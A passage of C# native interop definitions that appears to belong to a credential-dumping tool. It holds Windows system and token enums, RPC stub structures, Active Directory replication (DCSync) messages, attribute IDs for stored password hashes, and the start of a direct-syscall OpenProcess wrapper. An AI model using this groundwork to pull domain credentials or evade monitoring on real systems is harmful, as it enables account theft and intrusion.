            SystemSessionCreate = 0x002F,
            SystemSessionDetach = 0x0030,
            SystemSessionInformation = 0x0031,
            SystemRangeStartInformation = 0x0032,
            SystemVerifierInformation = 0x0033,
            SystemVerifierThunkExtend = 0x0034,
            SystemSessionProcessInformation = 0x0035,
            SystemLoadGdiDriverInSystemSpace = 0x0036,
            SystemNumaProcessorMap = 0x0037,
            SystemPrefetcherInformation = 0x0038,
            SystemExtendedProcessInformation = 0x0039,
            SystemRecommendedSharedDataAlignment = 0x003A,
            SystemComPlusPackage = 0x003B,
            SystemNumaAvailableMemory = 0x003C,
            SystemProcessorPowerInformation = 0x003D,
            SystemEmulationBasicInformation = 0x003E,
            SystemEmulationProcessorInformation = 0x003F,
            SystemExtendedHandleInformation = 0x0040,
            SystemLostDelayedWriteInformation = 0x0041,
            SystemBigPoolInformation = 0x0042,
            SystemSessionPoolTagInformation = 0x0043,
            SystemSessionMappedViewInformation = 0x0044,
            SystemHotpatchInformation = 0x0045,
            SystemObjectSecurityMode = 0x0046,
            SystemWatchdogTimerHandler = 0x0047,
            SystemWatchdogTimerInformation = 0x0048,
            SystemLogicalProcessorInformation = 0x0049,
            SystemWow64SharedInformationObsolete = 0x004A,
            SystemRegisterFirmwareTableInformationHandler = 0x004B,
            SystemFirmwareTableInformation = 0x004C,
            SystemModuleInformationEx = 0x004D,
            SystemVerifierTriageInformation = 0x004E,
            SystemSuperfetchInformation = 0x004F,
            SystemMemoryListInformation = 0x0050,
            SystemFileCacheInformationEx = 0x0051,
            SystemThreadPriorityClientIdInformation = 0x0052,
            SystemProcessorIdleCycleTimeInformation = 0x0053,
            SystemVerifierCancellationInformation = 0x0054,
            SystemProcessorPowerInformationEx = 0x0055,
            SystemRefTraceInformation = 0x0056,
            SystemSpecialPoolInformation = 0x0057,
            SystemProcessIdInformation = 0x0058,
            SystemErrorPortInformation = 0x0059,
            SystemBootEnvironmentInformation = 0x005A,
            SystemHypervisorInformation = 0x005B,
            SystemVerifierInformationEx = 0x005C,
            SystemTimeZoneInformation = 0x005D,
            SystemImageFileExecutionOptionsInformation = 0x005E,
            SystemCoverageInformation = 0x005F,
            SystemPrefetchPatchInformation = 0x0060,
            SystemVerifierFaultsInformation = 0x0061,
            SystemSystemPartitionInformation = 0x0062,
            SystemSystemDiskInformation = 0x0063,
            SystemProcessorPerformanceDistribution = 0x0064,
            SystemNumaProximityNodeInformation = 0x0065,
            SystemDynamicTimeZoneInformation = 0x0066,
            SystemCodeIntegrityInformation = 0x0067,
            SystemProcessorMicrocodeUpdateInformation = 0x0068,
            SystemProcessorBrandString = 0x0069,
            SystemVirtualAddressInformation = 0x006A,
            SystemLogicalProcessorAndGroupInformation = 0x006B,
            SystemProcessorCycleTimeInformation = 0x006C,
            SystemStoreInformation = 0x006D,
            SystemRegistryAppendString = 0x006E,
            SystemAitSamplingValue = 0x006F,
            SystemVhdBootInformation = 0x0070,
            SystemCpuQuotaInformation = 0x0071,
            SystemNativeBasicInformation = 0x0072,
            SystemErrorPortTimeouts = 0x0073,
            SystemLowPriorityIoInformation = 0x0074,
            SystemBootEntropyInformation = 0x0075,
            SystemVerifierCountersInformation = 0x0076,
            SystemPagedPoolInformationEx = 0x0077,
            SystemSystemPtesInformationEx = 0x0078,
            SystemNodeDistanceInformation = 0x0079,
            SystemAcpiAuditInformation = 0x007A,
            SystemBasicPerformanceInformation = 0x007B,
            SystemQueryPerformanceCounterInformation = 0x007C,
            SystemSessionBigPoolInformation = 0x007D,
            SystemBootGraphicsInformation = 0x007E,
            SystemScrubPhysicalMemoryInformation = 0x007F,
            SystemBadPageInformation = 0x0080,
            SystemProcessorProfileControlArea = 0x0081,
            SystemCombinePhysicalMemoryInformation = 0x0082,
            SystemEntropyInterruptTimingInformation = 0x0083,
            SystemConsoleInformation = 0x0084,
            SystemPlatformBinaryInformation = 0x0085,
            SystemThrottleNotificationInformation = 0x0086,
            SystemHypervisorProcessorCountInformation = 0x0087,
            SystemDeviceDataInformation = 0x0088,
            SystemDeviceDataEnumerationInformation = 0x0089,
            SystemMemoryTopologyInformation = 0x008A,
            SystemMemoryChannelInformation = 0x008B,
            SystemBootLogoInformation = 0x008C,
            SystemProcessorPerformanceInformationEx = 0x008D,
            SystemSpare0 = 0x008E,
            SystemSecureBootPolicyInformation = 0x008F,
            SystemPageFileInformationEx = 0x0090,
            SystemSecureBootInformation = 0x0091,
            SystemEntropyInterruptTimingRawInformation = 0x0092,
            SystemPortableWorkspaceEfiLauncherInformation = 0x0093,
            SystemFullProcessInformation = 0x0094,
            MaxSystemInfoClass = 0x0095
        }

        public struct TOKEN_ELEVATION
        {
            public int TokenIsElevated;
        }

        public enum TOKEN_INFORMATION_CLASS
        {
            TokenUser = 1,
            TokenGroups,
            TokenPrivileges,
            TokenOwner,
            TokenPrimaryGroup,
            TokenDefaultDacl,
            TokenSource,
            TokenType,
            TokenImpersonationLevel,
            TokenStatistics,
            TokenRestrictedSids,
            TokenSessionId,
            TokenGroupsAndPrivileges,
            TokenSessionReference,
            TokenSandBoxInert,
            TokenAuditPolicy,
            TokenOrigin,
            TokenElevationType,
            TokenLinkedToken,
            TokenElevation,
            TokenHasRestrictions,
            TokenAccessInformation,
            TokenVirtualizationAllowed,
            TokenVirtualizationEnabled,
            TokenIntegrityLevel,
            TokenUIAccess,
            TokenMandatoryPolicy,
            TokenLogonSid,
            TokenIsAppContainer,
            TokenCapabilities,
            TokenAppContainerSid,
            TokenAppContainerNumber,
            TokenUserClaimAttributes,
            TokenDeviceClaimAttributes,
            TokenRestrictedUserClaimAttributes,
            TokenRestrictedDeviceClaimAttributes,
            TokenDeviceGroups,
            TokenRestrictedDeviceGroups,
            TokenSecurityAttributes,
            TokenIsRestricted,
            MaxTokenInfoClass
        }

        public enum TOKEN_ELEVATION_TYPE
        {
            TokenElevationTypeDefault = 1,
            TokenElevationTypeFull,
            TokenElevationTypeLimited
        }

        [Flags]
        public enum THREAD_WRITE_FLAGS : uint
        {
            ThreadWriteThread = 0x0001,
            ThreadWriteStack = 0x0002,
            ThreadWriteContext = 0x0004,
            ThreadWriteBackingStore = 0x0008,
            ThreadWriteInstructionWindow = 0x0010,
            ThreadWriteThreadData = 0x0020,
            ThreadWriteThreadInfo = 0x0040
        }

        [Flags]
        public enum MODULE_WRITE_FLAGS : uint
        {
            ModuleWriteModule = 0x0001,
            ModuleWriteDataSeg = 0x0002,
            ModuleWriteMiscRecord = 0x0004,
            ModuleWriteCvRecord = 0x0008,
            ModuleReferencedByMemory = 0x0010,
            ModuleWriteTlsData = 0x0020,
            ModuleWriteCodeSegs = 0x0040
        }

        public enum CONTEXT_FLAGS : uint
        {
            CONTEXT_i386 = 0x10000,
            CONTEXT_i486 = 0x10000,   //  same as i386
            CONTEXT_CONTROL = CONTEXT_i386 | 0x01, // SS:SP, CS:IP, FLAGS, BP
            CONTEXT_INTEGER = CONTEXT_i386 | 0x02, // AX, BX, CX, DX, SI, DI
            CONTEXT_SEGMENTS = CONTEXT_i386 | 0x04, // DS, ES, FS, GS
            CONTEXT_FLOATING_POINT = CONTEXT_i386 | 0x08, // 387 state
            CONTEXT_DEBUG_REGISTERS = CONTEXT_i386 | 0x10, // DB 0-3,6,7
            CONTEXT_EXTENDED_REGISTERS = CONTEXT_i386 | 0x20, // cpu specific extensions
            CONTEXT_FULL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS,
            CONTEXT_ALL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS | CONTEXT_FLOATING_POINT | CONTEXT_DEBUG_REGISTERS | CONTEXT_EXTENDED_REGISTERS
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct M128A
        {
            public ulong High;
            public long Low;

            public override string ToString()
            {
                return string.Format("High:{0}, Low:{1}", this.High, this.Low);
            }
        }

        public static int LOGON32_LOGON_NEW_CREDENTIALS = 9;
        public static int LOGON32_PROVIDER_WINNT50 = 3;

        /// <summary>
        /// x64
        /// </summary>
        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct XSAVE_FORMAT64
        {
            public ushort ControlWord;
            public ushort StatusWord;
            public byte TagWord;
            public byte Reserved1;
            public ushort ErrorOpcode;
            public uint ErrorOffset;
            public ushort ErrorSelector;
            public ushort Reserved2;
            public uint DataOffset;
            public ushort DataSelector;
            public ushort Reserved3;
            public uint MxCsr;
            public uint MxCsr_Mask;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public M128A[] FloatRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public M128A[] XmmRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 96)]
            public byte[] Reserved4;
        }

        /// <summary>
        /// x64
        /// </summary>
        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct CONTEXT
        {
            public ulong P1Home;
            public ulong P2Home;
            public ulong P3Home;
            public ulong P4Home;
            public ulong P5Home;
            public ulong P6Home;

            public CONTEXT_FLAGS ContextFlags;
            public uint MxCsr;

            public ushort SegCs;
            public ushort SegDs;
            public ushort SegEs;
            public ushort SegFs;
            public ushort SegGs;
            public ushort SegSs;
            public uint EFlags;

            public ulong Dr0;
            public ulong Dr1;
            public ulong Dr2;
            public ulong Dr3;
            public ulong Dr6;
            public ulong Dr7;

            public ulong Rax;
            public ulong Rcx;
            public ulong Rdx;
            public ulong Rbx;
            public ulong Rsp;
            public ulong Rbp;
            public ulong Rsi;
            public ulong Rdi;
            public ulong R8;
            public ulong R9;
            public ulong R10;
            public ulong R11;
            public ulong R12;
            public ulong R13;
            public ulong R14;
            public ulong R15;
            public ulong Rip;

            public XSAVE_FORMAT64 DUMMYUNIONNAME;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 26)]
            public M128A[] VectorRegister;
            public ulong VectorControl;

            public ulong DebugControl;
            public ulong LastBranchToRip;
            public ulong LastBranchFromRip;
            public ulong LastExceptionToRip;
            public ulong LastExceptionFromRip;
        }

        public enum SID_NAME_USE
        {
            SidTypeUser = 1,
            SidTypeGroup,
            SidTypeDomain,
            SidTypeAlias,
            SidTypeWellKnownGroup,
            SidTypeDeletedAccount,
            SidTypeInvalid,
            SidTypeUnknown,
            SidTypeComputer
        }

        [Flags()]
        public enum UserAccountControl : int
        {
            SCRIPT = 0x00000001,
            ACCOUNTDISABLE = 0x00000002,
            HOMEDIR_REQUIRED = 0x00000008,
            LOCKOUT = 0x00000010,
            PASSWD_NOTREQD = 0x00000020,
            PASSWD_CANT_CHANGE = 0x00000040,
            ENCRYPTED_TEXT_PASSWORD_ALLOWED = 0x00000080,
            TEMP_DUPLICATE_ACCOUNT = 0x00000100,
            NORMAL_ACCOUNT = 0x00000200,
            INTERDOMAIN_TRUST_ACCOUNT = 0x00000800,
            WORKSTATION_TRUST_ACCOUNT = 0x00001000,
            SERVER_TRUST_ACCOUNT = 0x00002000,
            Unused1 = 0x00004000,
            Unused2 = 0x00008000,
            DONT_EXPIRE_PASSWD = 0x00010000,
            MNS_LOGON_ACCOUNT = 0x00020000,
            SMARTCARD_REQUIRED = 0x00040000,
            TRUSTED_FOR_DELEGATION = 0x00080000,
            NOT_DELEGATED = 0x00100000,
            USE_DES_KEY_ONLY = 0x00200000,
            DONT_REQUIRE_PREAUTH = 0x00400000,
            PASSWORD_EXPIRED = 0x00800000,
            TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION = 0x01000000,
            PARTIAL_SECRETS_ACCOUNT = 0x04000000,
            USE_AES_KEYS = 0x08000000
        }

        [Flags()]
        public enum SamAccountType : uint
        {
            DOMAIN_OBJECT = 0x00000000,
            GROUP_OBJECT = 0x10000000,
            NON_SECURITY_GROUP_OBJECT = 0x10000001,
            ALIAS_OBJECT = 0x20000000,
            NON_SECURITY_ALIAS_OBJECT = 0x20000001,
            USER_OBJECT = 0x30000000,
            MACHINE_ACCOUNT = 0x30000001,
            TRUST_ACCOUNT = 0x30000002,
            APP_BASIC_GROUP = 0x40000000,
            APP_QUERY_GROUP = 0x40000001
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct USER_PROPERTIES
        {
            public uint Reserved1;
            public uint Length;
            public ushort Reserved2;
            public ushort Reserved3;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 96)]
            public byte[] Reserved4;
            public char PropertySignature;
            public ushort PropertyCount;
            public USER_PROPERTY[] UserProperties;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 2)]
        public struct USER_PROPERTY
        {
            public ushort NameLength;
            public ushort ValueLength;
            public ushort Reserved;
            public string PropertyName;
            // PropertyValue in HEX !
        }


        public enum ASN1encodingrule_e
        {
            ASN1_BER_RULE_BER = 0x0100,
            ASN1_BER_RULE_CER = 0x0200,
            ASN1_BER_RULE_DER = 0x0400,
            ASN1_BER_RULE = ASN1_BER_RULE_BER | ASN1_BER_RULE_CER | ASN1_BER_RULE_DER,
        }

        public enum ASN1Flags : long
        {
            ASN1FLAGS_NONE = 0x00000000L, /* no flags */
            ASN1FLAGS_NOASSERT = 0x00001000L, /* no asertion */
        }

        public enum ASN1error_e
        {
            ASN1_SUCCESS = 0,            /* success */

            // Teles specific error codes
            ASN1_ERR_INTERNAL = (-1001),      /* internal error */
            ASN1_ERR_EOD = (-1002),      /* unexpected end of data */
            ASN1_ERR_CORRUPT = (-1003),      /* corrupted data */
            ASN1_ERR_LARGE = (-1004),      /* value too large */
            ASN1_ERR_CONSTRAINT = (-1005),      /* constraint violated */
            ASN1_ERR_MEMORY = (-1006),      /* out of memory */
            ASN1_ERR_OVERFLOW = (-1007),      /* buffer overflow */
            ASN1_ERR_BADPDU = (-1008),      /* function not supported for this pdu*/
            ASN1_ERR_BADARGS = (-1009),      /* bad arguments to function call */
            ASN1_ERR_BADREAL = (-1010),      /* bad real value */
            ASN1_ERR_BADTAG = (-1011),      /* bad tag value met */
            ASN1_ERR_CHOICE = (-1012),      /* bad choice value */
            ASN1_ERR_RULE = (-1013),      /* bad encoding rule */
            ASN1_ERR_UTF8 = (-1014),      /* bad unicode (utf8) */

            // New error codes
            ASN1_ERR_PDU_TYPE = (-1051),      /* bad pdu type */
            ASN1_ERR_NYI = (-1052),      /* not yet implemented */

            // Teles specific warning codes
            ASN1_WRN_EXTENDED = 1001,         /* skipped unknown extension(s) */
            ASN1_WRN_NOEOD = 1002,         /* end of data expected */
        }


        [StructLayout(LayoutKind.Sequential)]
        public struct ASN1BerFunArr_t
        {
            IntPtr apfnEncoder;//ASN1BerEncFun_t
            IntPtr apfnDecoder;//ASN1BerDecFun_t
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct ASN1module_t
        {
            uint nModuleName;
            ASN1encodingrule_e eRule;
            uint dwFlags;
            uint cPDUs;

            //__field_xcount(cPDUs)
            IntPtr apfnFreeMemory;//ASN1FreeFun_t

            //__field_xcount(cPDUs)
            IntPtr acbStructSize;//uint

            ASN1BerFunArr_t BER;
        }


        [StructLayout(LayoutKind.Sequential)]
        public struct ASN1encoding_s
        {
            public uint magic;  /* magic for this structure */
            public uint version;/* version number of this library */
            public IntPtr module; /* module this encoding_t depends to */
            //__field_bcount(size)
            IntPtr buf;    /* buffer to encode into */
            uint size;   /* current size of buffer */
            uint len;    /* len of encoded data in buffer */
            ASN1error_e err;    /* error code for last encoding */
            uint bit;
            IntPtr pos;
            uint cbExtraHeader;
            ASN1encodingrule_e eRule;
            uint dwFlags;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct ASN1decoding_s
        {
            uint magic;  /* magic for this structure */
            uint version;/* version number of this library */
            IntPtr module; /* module this decoding_t depends to */
            //__field_bcount(size)
            IntPtr buf;    /* buffer to decode from */
            uint size;   /* size of buffer */
            uint len;    /* len of decoded data in buffer */
            ASN1error_e err;    /* error code for last decoding */
            uint bit;
            IntPtr pos;
            ASN1encodingrule_e eRule;
            uint dwFlags;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct OssEncodedOID
        {
            public ushort length;
            public IntPtr value;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PARTIAL_ATTR_VECTOR_V1_EXT
        {
            public uint dwVersion;
            public uint dwReserved1;
            public uint cAttrs;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 19)]
            public uint[] rgPartialAttr;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PrefixTableEntry
        {
            public uint ndx;
            public OID_t prefix;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct OID_t
        {
            public uint length;
            public IntPtr elements;//Byte *
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct QUOTA_LIMITS {
            UInt64 PagedPoolLimit;
            UInt64 NonPagedPoolLimit;
            UInt64 MinimumWorkingSetSize;
            UInt64 MaximumWorkingSetSize;
            UInt64 PagefileLimit;
            LARGE_INTEGER TimeLimit;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct TOKEN_SOURCE
        {
            private const int TOKEN_SOURCE_LENGTH = 8;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = TOKEN_SOURCE_LENGTH)]
            public byte[] Name;
            public LUID SourceIdentifier;
        }

        public  enum MSV1_0_LOGON_SUBMIT_TYPE
        {
            MsV1_0InteractiveLogon = 2,
            MsV1_0Lm20Logon,
            MsV1_0NetworkLogon,
            MsV1_0SubAuthLogon,
            MsV1_0WorkstationUnlockLogon,
            MsV1_0S4ULogon,
            MsV1_0VirtualLogon,
            MsV1_0NoElevationLogon,
            MsV1_0LuidLogon
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct MSV1_0_INTERACTIVE_LOGON {
            public MSV1_0_LOGON_SUBMIT_TYPE MessageType;
            public UNICODE_STRING LogonDomainName;
            public UNICODE_STRING UserName;
            public UNICODE_STRING Password;
        }

        public enum SECURITY_LOGON_TYPE
        {
            UndefinedLogonType = 1,
            Interactive,
            Network,
            Batch,
            Service,
            Proxy,
            Unlock,
            NetworkCleartext,
            NewCredentials,
            RemoteInteractive,
            CachedInteractive,
            CachedRemoteInteractive,
            CachedUnlock
        }

        //DCSync author LE TOUX (vincent.letoux@mysmartlogon.com)
        //https://raw.githubusercontent.com/vletoux/MakeMeEnterpriseAdmin/master/MakeMeEnterpriseAdmin.ps1
        [StructLayout(LayoutKind.Sequential)]
        public struct RPC_SECURITY_QOS
        {
            public uint Version;
            public uint Capabilities;
            public uint IdentityTracking;
            public uint ImpersonationType;
        };

        [StructLayout(LayoutKind.Sequential)]
        public struct SecPkgContext_SessionKey
        {
            public uint SessionKeyLength;
            public IntPtr SessionKey;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct CRYPTO_BUFFER
        {
            public uint Length;
            public uint MaximumLength;
            public IntPtr Buffer;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct COMM_FAULT_OFFSETS
        {
            public short CommOffset;
            public short FaultOffset;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct GENERIC_BINDING_ROUTINE_PAIR
        {
            public IntPtr Bind;
            public IntPtr Unbind;
        }


        [StructLayout(LayoutKind.Sequential)]
        public struct RPC_VERSION
        {
            public ushort MajorVersion;
            public ushort MinorVersion;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct RPC_SYNTAX_IDENTIFIER
        {
            public Guid SyntaxGUID;
            public RPC_VERSION SyntaxVersion;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct RPC_CLIENT_INTERFACE
        {
            public uint Length;
            public RPC_SYNTAX_IDENTIFIER InterfaceId;
            public RPC_SYNTAX_IDENTIFIER TransferSyntax;
            public IntPtr DispatchTable;  //PRPC_DISPATCH_TABLE
            public uint RpcProtseqEndpointCount;
            public IntPtr RpcProtseqEndpoint; //PRPC_PROTSEQ_ENDPOINT
            public IntPtr Reserved;
            public IntPtr InterpreterInfo;
            public uint Flags;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct MIDL_STUB_DESC
        {
            public IntPtr /*RPC_CLIENT_INTERFACE*/ RpcInterfaceInformation;
            public IntPtr pfnAllocate;
            public IntPtr pfnFree;
            public IntPtr pAutoBindHandle;
            public IntPtr /*NDR_RUNDOWN*/ apfnNdrRundownRoutines;
            public IntPtr /*GENERIC_BINDING_ROUTINE_PAIR*/ aGenericBindingRoutinePairs;
            public IntPtr /*EXPR_EVAL*/ apfnExprEval;
            public IntPtr /*XMIT_ROUTINE_QUINTUPLE*/ aXmitQuintuple;
            public IntPtr pFormatTypes;
            public int fCheckBounds;
            /* Ndr library version. */
            public uint Version;
            public IntPtr /*MALLOC_FREE_STRUCT*/ pMallocFreeStruct;
            public int MIDLVersion;
            public IntPtr CommFaultOffsets;
            // New fields for version 3.0+
            public IntPtr /*USER_MARSHAL_ROUTINE_QUADRUPLE*/ aUserMarshalQuadruple;
            // Notify routines - added for NT5, MIDL 5.0
            public IntPtr /*NDR_NOTIFY_ROUTINE*/ NotifyRoutineTable;
            public IntPtr mFlags;
            // International support routines - added for 64bit post NT5
            public IntPtr /*NDR_CS_ROUTINES*/ CsRoutineTables;
            public IntPtr ProxyServerInfo;
            public IntPtr /*NDR_EXPR_DESC*/ pExprInfo;
            // Fields up to now present in win2000 release.
        }

        public enum NETLOGON_SECURE_CHANNEL_TYPE
        {
            NullSecureChannel = 0,
            MsvApSecureChannel = 1,
            WorkstationSecureChannel = 2,
            TrustedDnsDomainSecureChannel = 3,
            TrustedDomainSecureChannel = 4,
            UasServerSecureChannel = 5,
            ServerSecureChannel = 6,
            CdcServerSecureChannel = 7
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct NETLOGON_AUTHENTICATOR
        {
            public NETLOGON_CREDENTIAL Credential;
            public uint Timestamp;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct NETLOGON_CREDENTIAL
        {
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public byte[] data;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct NL_TRUST_PASSWORD
        {
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
            public byte[] Buffer;
            public uint Length;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct SEC_WINNT_AUTH_IDENTITY_W
        {
            public string User;
            public int UserLength;
            public string Domain;
            public int DomainLength;
            public string Password;
            public int PasswordLength;
            public int Flags; //2 Uni
        }

        /*[StructLayout(LayoutKind.Sequential)]
        public struct RPC_CLIENT_INTERFACE
        {
            uint Length;
            RPC_SYNTAX_IDENTIFIER InterfaceId;
            RPC_SYNTAX_IDENTIFIER TransferSyntax;
            RPC_DISPATCH_TABLE DispatchTable; //RPC_DISPATCH_TABLE
            uint RpcProtseqEndpointCount;
            IntPtr RpcProtseqEndpoint;//RPC_PROTSEQ_ENDPOINT
            uint Reserved;
            IntPtr InterpreterInfo;
            uint Flags;
        }*/

        [StructLayout(LayoutKind.Sequential)]
        public struct RPC_DISPATCH_TABLE
        {
            uint DispatchTableCount;
            IntPtr DispatchTable;//RPC_DISPATCH_FUNCTION
            int Reserved;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct RPC_PROTSEQ_ENDPOINT
        {
            IntPtr RpcProtocolSequence;
            IntPtr Endpoint;
        }

        #region RPC structures
        [StructLayout(LayoutKind.Sequential)]
        public struct DRS_EXTENSIONS_INT
        {
            public UInt32 cb;
            public UInt32 dwFlags;
            public Guid SiteObjGuid;
            public UInt32 Pid;
            public UInt32 dwReplEpoch;
            public UInt32 dwFlagsExt;
            public Guid ConfigObjGUID;
            public UInt32 dwExtCaps;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct DRS_MSG_DCINFOREQ_V1
        {
            public IntPtr Domain;
            public UInt32 InfoLevel;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct DRS_MSG_DCINFOREPLY_V2
        {
            public UInt32 cItems;
            public IntPtr rItems;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct DS_DOMAIN_CONTROLLER_INFO_2W
        {
            public IntPtr NetbiosName;
            public IntPtr DnsHostName;
            public IntPtr SiteName;
            public IntPtr SiteObjectName;
            public IntPtr ComputerObjectName;
            public IntPtr ServerObjectName;
            public IntPtr NtdsDsaObjectName;
            public UInt32 fIsPdc;
            public UInt32 fDsEnabled;
            public UInt32 fIsGc;
            public Guid SiteObjectGuid;
            public Guid ComputerObjectGuid;
            public Guid ServerObjectGuid;
            public Guid NtdsDsaObjectGuid;
        }


        [StructLayout(LayoutKind.Sequential)]
        public struct USN_VECTOR
        {
            public long usnHighObjUpdate;
            public long usnReserved;
            public long usnHighPropUpdate;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SCHEMA_PREFIX_TABLE
        {
            public UInt32 PrefixCount;
            public IntPtr pPrefixEntry;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct DSNAME
        {
            public UInt32 structLen;
            public UInt32 SidLen;
            public Guid Guid;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 28)]
            public byte[] Sid;
            public UInt32 NameLen;
            public byte StringName;
        };

        [StructLayout(LayoutKind.Sequential)]
        public struct DRS_MSG_GETCHGREQ_V8
        {
            public Guid uuidDsaObjDest;
            public Guid uuidInvocIdSrc;
            public IntPtr pNC;
            public USN_VECTOR usnvecFrom;
            public IntPtr pUpToDateVecDest;
            public UInt32 ulFlags;
            public UInt32 cMaxObjects;
            public UInt32 cMaxBytes;
            public UInt32 ulExtendedOp;
            public ulong liFsmoInfo;
            public IntPtr pPartialAttrSet;
            public IntPtr pPartialAttrSetEx;
            public SCHEMA_PREFIX_TABLE PrefixTableDest;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct DRS_MSG_GETCHGREPLY_V6
        {
            public Guid uuidDsaObjSrc;
            public Guid uuidInvocIdSrc;
            public IntPtr pNC;
            public USN_VECTOR usnvecFrom;
            public USN_VECTOR usnvecTo;
            public IntPtr pUpToDateVecSrc;
            public SCHEMA_PREFIX_TABLE PrefixTableSrc;
            public UInt32 ulExtendedRet;
            public UInt32 cNumObjects;
            public UInt32 cNumBytes;
            public IntPtr pObjects;
            public UInt32 fMoreData;
            public UInt32 cNumNcSizeObjects;
            public UInt32 cNumNcSizeValues;
            public UInt32 cNumValues;
            public IntPtr rgValues;
            public UInt32 dwDRSError;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct DRS_MSG_CRACKREQ_V1
        {
            public UInt32 CodePage;
            public UInt32 LocaleId;
            public UInt32 dwFlags;
            public UInt32 formatOffered;
            public UInt32 formatDesired;
            public UInt32 cNames;
            public IntPtr rpNames;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct DS_NAME_RESULT_ITEMW
        {
            public UInt32 status;
            public IntPtr pDomain;
            public IntPtr pName;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct DS_NAME_RESULTW
        {
            public UInt32 cItems;
            public IntPtr rItems;
        }


        [StructLayout(LayoutKind.Sequential)]
        public struct ATTRVAL
        {
            public UInt32 valLen;
            public IntPtr pVal;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct ATTRVALBLOCK
        {
            public UInt32 valCount;
            public IntPtr pAVal;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct ATTR
        {
            public UInt32 attrTyp;
            public ATTRVALBLOCK AttrVal;
        }


        [StructLayout(LayoutKind.Sequential)]
        public struct ATTRBLOCK
        {
            public UInt32 attrCount;
            public IntPtr pAttr;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct ENTINF
        {
            public IntPtr pName;
            public UInt32 ulFlags;
            public ATTRBLOCK AttrBlock;
        };
        [StructLayout(LayoutKind.Sequential)]
        public struct REPLENTINFLIST
        {
            public IntPtr pNextEntInf;
            public ENTINF Entinf;
            public UInt32 fIsNCPrefix;
            public IntPtr pParentGuid;
            public IntPtr pMetaDataExt;
        }

        public enum ATT
        {

            ATT_WHEN_CREATED = 131074,
            ATT_WHEN_CHANGED = 131075,
            [Description("displayName")]
            ATT_RDN = 589825,
            ATT_OBJECT_SID = 589970,
            ATT_SAM_ACCOUNT_NAME = 590045,
            ATT_USER_PRINCIPAL_NAME = 590480,
            ATT_SERVICE_PRINCIPAL_NAME = 590595,
            ATT_SID_HISTORY = 590433,
            ATT_USER_ACCOUNT_CONTROL = 589832,
            ATT_SAM_ACCOUNT_TYPE = 590126,
            ATT_LOGON_HOURS = 589888,
            ATT_LOGON_WORKSTATION = 589889,
            [Description("lastLogon")]
            ATT_LAST_LOGON = 589876,
            ATT_PWD_LAST_SET = 589920,
            ATT_ACCOUNT_EXPIRES = 589983,
            ATT_LOCKOUT_TIME = 590486,
            ATT_UNICODE_PWD = 589914,
            ATT_NT_PWD_HISTORY = 589918,
            ATT_DBCS_PWD = 589879,
            ATT_LM_PWD_HISTORY = 589984,
            ATT_SUPPLEMENTAL_CREDENTIALS = 589949,
            ATT_CURRENT_VALUE = 589851,
            ATT_TRUST_ATTRIBUTES = 590294,
            ATT_TRUST_AUTH_INCOMING = 589953,
            ATT_TRUST_AUTH_OUTGOING = 589959,
            ATT_TRUST_DIRECTION = 589956,
            ATT_TRUST_PARENT = 590295,
            ATT_TRUST_PARTNER = 589957,
            ATT_TRUST_TYPE = 589960

        }
        #endregion

        public static IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, int processId)
        {
            Natives.CLIENT_ID clientid = new Natives.CLIENT_ID();
            clientid.UniqueProcess = (IntPtr)processId;
            clientid.UniqueThread = IntPtr.Zero;

            IntPtr hProcess = IntPtr.Zero;

            Natives.OBJECT_ATTRIBUTES objAttribute = new Natives.OBJECT_ATTRIBUTES();

            NTSTATUS res = SysCall.ZwOpenProcess10(ref hProcess, processAccess, objAttribute, ref clientid);

            if (hProcess == IntPtr.Zero)
            {
                Console.WriteLine("[x] Error ZwOpenProcess10  " + res);
